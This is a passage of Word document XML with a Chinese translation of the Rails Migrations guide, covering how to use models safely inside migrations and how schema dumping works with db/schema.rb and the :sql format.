          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5AEA002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app/model/product.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E15A9F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00257C7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Product &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="392482A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:flag,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48B4F49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C90F16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爱丽丝又添加了一个migration来添加和初始化另一个字段并同样在model中添加了验证。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="04462C6C" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F8B348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db/migrate/20100515121110_add_fuzz_to_product.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A6BB73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115FFF4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AddFuzzToProduct &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AD172C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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="402C2AC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add_column :products, :fuzz, :string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79721E3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Product.all.each</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|product|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29FECCF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product.update_attributes! :fuzz</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'fuzzy'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F0B2D6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5AD8947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41C3815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r w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="66071206" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1322CCB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app/model/product.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3914DCD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068820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Product &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7450947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:flag, :fuzz,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525D72B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384B62D2"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这两个migrations在爱丽丝用起来是可以正常工作的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1AE8A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鲍勃从他的假期回来后他做了以下操作：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065D459D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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更新源代码 – 包含了艾丽丝添加的那两个migrations和最新版本的Product model。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434448D0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>命令来执行还未执行的migrations（包含那个更新</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>product</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>model 的migration）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAA36E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Migration执行失败，因为当model尝试保存的时候它会去验证那两个新增加的字段，而这些 字段在第一个migration执行的时候还没有添加数据库。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0AFFB25A" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7609A9A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rake aborted!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BBEC5D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An error has occurred, this and all later migrations canceled:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10B9605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32B2A8B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undefined method `fuzz' for #&lt;Product:0x000001049b14a0&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0E69E4D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对于这种情况可以尝试在migration中建立一个本地的model来修复。这样避免了validations 的执行，因此这个migration可以完成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7BC94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当使用假的(faux)model时，我们可以直接调用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Product.reset_column_information</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来更新</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Product</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模型的缓存从而在数据库中更新数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE611E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如果爱丽丝能这样做，那么将不会有问题发生。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="2B6384C1" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07495B4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db/migrate/20100513121110_add_flag_to_product.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="243E970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10345C7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AddFlagToProduct &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43CBAC7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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Product &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77A4921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7F85916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422767B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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CC3C9B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add_column :products, :flag, :boolean</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E1DC48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Product.reset_column_information</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5709231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Product.all.each</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|product|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1495190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product.update_attributes!(:flag</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36EE074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649ABBB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1F200B7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r w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="07CAACEC" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23E8BB6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db/migrate/20100515121110_add_fuzz_to_product.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="326934D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091D8D6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AddFuzzToProduct &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DC5713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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Product &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A9546E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3BCE431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2F1B40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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D938FF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add_column :products, :fuzz, :string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6106A51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Product.reset_column_information</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56F90DB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Product.all.each</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|product|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B9030E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product.update_attributes!(:fuzz</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'fuzzy')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55B1A8D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1BA761E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7F62AE6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5589010"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6 导出数据库纲要(Schema Dumping)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319B5D60"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6.1 Schema文件的作用?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305A021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虽然我们用Migrations来定义database schema(数据库纲要)，但是我们却不能一次看到完 整精确的schema。这个机制是由</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db/schema.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>或是Active Record检验数据库后所生成的 SQL文件来担当。它们设计出来不是用来编辑的，只是纯粹代表着数据库的schema现况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0810155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当我们要部署新的应用程序时，并不需要把整个migrations历程全部重跑一遍，我们只需要 把当前的schema载入新的数据库就可以了。这样做会更快更简单。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1049C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例如，这就是建立一个测试用数据库所做的操作：把当前开发环境下的数据库导出来（ 看是db/schema.rb或db/development.sql都行），然后再载入到测试数据库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47EC467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另外，如果要快速浏览Active Record 对象中有哪些属性也可以通过schema文件。关于 Active Record对象属性的信息并不在model的代码中，而且可能会散布在多个migrations 之间，但是最终都会整理在schema文件中。其次，有个插件叫做"annotate_models":https://github.com/ctran/annotate_models ， 可以把schema的结果自动用注释的方式放在每个model的上面，有需要也可以看一下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E573863"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6.2 数据库纲要(Schema)的导出类型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031B17E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导出的schema有 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:sql</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:ruby</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 两种方式，可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_record.schema_format</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来设置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41713FB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如果设定成</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:ruby</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的话，schema就会存在</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db/schema.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里面。这个文件看起来像是一个 超大的migration。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="1A09BB64" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30A5B21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ActiveRecord::Schema.define(:version</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 20080906171750) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FAEC53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create_table "authors", :force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4ED0E88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t.string   "name"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F74A40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t.datetime "created_at"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78C5BAD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t.datetime "updated_at"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="549CE40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21E5B7F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04CE5DA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create_table "products", :force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|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BEAFBD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t.string   "name"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00CB9DA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t.text "description"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E6CCF6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t.datetime "created_at"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F5CE52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t.datetime "updated_at"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39CEF20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t.string "part_number"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5326C56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11703E1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2669B1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各方面来说，它也的确如此。这个文件的生成方式，正是在检查数据库并用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">、 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>add_index</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>等方法，来表达数据库的结构。由于schema是独立于数据库系统的，只要是 Active Record支持的数据库系统，它都可以载入。如果你的应用程序要发布到多个数据库 系统，这点会非常有用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35575CF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不过，这也是有考量的：</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db/schema.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>没办法表达出特定数据库所专属的功能，像是外键 约束(foreign key constraints)、触发(triggers)或是预存程序(stored procedures)。 虽然migration里面可以执行自定义的SQL语句，但是schema dumper却无法从数据库中将它 们重组回来。如果你要用到这个自定义SQL的功能，那么就必须把schema的格式设定成</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:sql</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7396A41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设定成</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:sql</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的话就不是用Active Record来导出Schema了，而是用该数据库系统的专门工具， 从</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:structure:dump</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>这个Rake任务导进</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db/#{Rails.env}_structure.sql</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里面。比方说， 用PostgreSQL的话，就是用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>pg_dump</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
